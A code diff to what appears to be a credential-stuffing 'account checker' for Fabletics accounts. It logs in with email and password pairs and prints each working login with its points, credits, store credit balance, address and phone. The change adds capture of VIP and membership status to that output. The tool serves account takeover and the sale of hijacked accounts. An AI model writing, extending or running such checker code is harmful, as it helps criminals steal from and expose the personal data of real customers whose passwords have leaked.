@@ -44,8 +44,13 @@ class CheckResult:
 
         phone = self.data.get("phone") or "N/A"
 
+        vip_label = "Yes" if self.data.get("is_vip") else "No"
+        membership_status = self.data.get("membership_status") or "Unknown"
+
         return (
             f"{self.email}:{self.password} | "
+            f"VIP = {vip_label} | "
+            f"Membership = [{membership_status}] | "
             f"Points = {self.data.get('points', 0)} | "
             f"Member_Credits = {self.data.get('member_credits', 0)} | "
             f"storeCreditBalance = {store_credit} | "
@@ -111,6 +116,43 @@ def _extract_phone(
     return "N/A"
 
 
+def _derive_vip_info(membership: dict[str, Any]) -> dict[str, Any]:
+    status_label = str(
+        membership.get("statusLabel") or membership.get("status") or "Unknown"
+    ).strip()
+    type_label = str(
+        membership.get("membershipTypeLabel")
+        or membership.get("membershipType")
+        or membership.get("periodType")
+        or ""
+    ).strip()
+    combined = f"{status_label} {type_label}".lower()
+    inactive_markers = (
+        "cancel",
+        "inactive",
+        "expired",
+        "lapsed",
+        "terminated",
+        "non-vip",
+        "nonvip",
+    )
+    is_inactive = any(marker in combined for marker in inactive_markers)
+    has_vip_marker = "vip" in combined or bool(membership.get("vipPlusPerksAvailable"))
+
+    is_vip = has_vip_marker and not is_inactive
+    if membership.get("isActiveVip") is True:
+        is_vip = True
+    if membership.get("isActiveVip") is False:
+        is_vip = False
+
+    return {
+        "membership_status": status_label or "Unknown",
+        "membership_type": type_label or "N/A",
+        "is_vip": is_vip,
+        "vip_plus_perks": bool(membership.get("vipPlusPerksAvailable", False)),
+    }
+
+
 def _format_address(address: dict[str, Any]) -> str:
     first = str(address.get("firstName") or "").strip()
     last = str(address.get("lastName") or "").strip()
@@ -170,6 +212,7 @@ def capture_account_data(client: FableticsClient, token: str, login_customer: di
     store_credit_balance = float(membership.get("storeCreditBalance") or 0)
 
     phone = _extract_phone(login_customer, addresses, default_address, profile)
+    vip_info = _derive_vip_info(membership if isinstance(membership, dict) else {})
 
     return {
         "points": points,
@@ -180,6 +223,7 @@ def capture_account_data(client: FableticsClient, token: str, login_customer: di
         "address": _format_address(default_address) if default_address else "N/A",
         "email": _first(login_customer, "email"),
         "customer_id": _first(login_customer, "id"),
+        **vip_info,
     }
 
 
